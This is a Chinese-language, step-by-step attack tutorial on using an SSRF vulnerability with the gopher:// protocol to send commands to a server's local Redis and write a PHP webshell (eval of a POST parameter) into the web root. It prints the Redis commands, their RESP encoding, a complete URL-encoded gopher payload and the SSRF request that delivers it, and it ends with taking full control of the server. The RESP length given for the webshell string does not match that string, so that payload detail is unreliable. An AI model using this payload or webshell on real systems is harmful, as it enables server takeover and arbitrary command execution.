### SSRF 怎么用 Redis 写 Shell

**步骤一：利用 SSRF 伪造 Redis 协议请求**

SSRF 攻击需要将恶意请求发送给目标服务器的 Redis 服务。这里通常需要使用 **Gopher 协议**。Gopher 协议可以发送自定义的 TCP 请求，这正是我们与 Redis 交互所需要的

Redis 的通信协议（RESP）是一个基于文本的协议。我们可以使用 Gopher 协议将这些命令编码成 URL 格式

**Redis 命令序列：**

我们通过 SSRF 漏洞向 Redis 服务器依次发送以下命令：

1. `SET webshell "<?php eval($_POST['cmd']);?>"`：设置一个键名为 `webshell`，值为我们想要写入的 Webshell 代码
2. `CONFIG SET dir "/var/www/html/"`：设置 Redis 的工作目录为网站的根目录
3. `CONFIG SET dbfilename "shell.php"`：设置持久化文件名为 `shell.php`
4. `SAVE`：执行保存命令，将数据持久化到指定的文件中

**步骤二：将命令编码为 Gopher 协议 URL**

我们需要将上述 Redis 命令序列转换成 Gopher URL

- **将命令转换为 RESP 协议格式**：

  - `SET webshell "<?php eval($_POST['cmd']);?>"`  -> `*3\r\n$3\r\nSET\r\n$7\r\nwebshell\r\n$25\r\n<?php eval($_POST['cmd']);?>\r\n`
  - `CONFIG SET dir "/var/www/html/"` -> `*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$14\r\n/var/www/html/\r\n`
  - `CONFIG SET dbfilename "shell.php"` -> `*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n`
  - `SAVE` -> `*1\r\n$4\r\nSAVE\r\n`

  *注：`\r\n` 是回车换行符，在 URL 中需要编码为 `%0d%0a`*

- **拼接成完整的 Gopher URL**： `gopher://127.0.0.1:6379/_` + `[RESP 编码的命令]` + `%0d%0a` + `[RESP 编码的命令]` + ...

  一个完整的 Gopher URL 示例如下：

  ```apl
  gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$7%0d%0awebshell%0d%0a$25%0d%0a%3c%3fphp%20eval%28%24_POST%5b%27cmd%27%5d%29%3b%3f%3e%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$14%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
  ```

**步骤三：通过 SSRF 漏洞发起请求**

将上述构造好的 URL 作为 SSRF 漏洞的参数值，例如：

```apl
http://example.com/ssrf.php?url=gopher://127.0.0.1:6379/_...
```

当服务器端执行这个请求时，它会通过 Gopher 协议向本地的 Redis 服务发送一系列命令，最终在 `/var/www/html/` 目录下生成一个名为 `shell.php` 的文件，其内容就是我们的 Webshell

**步骤四：访问 Webshell**

攻击者现在可以直接访问 `http://example.com/shell.php`，并通过 `cmd` 参数执行任意命令，从而完全控制服务器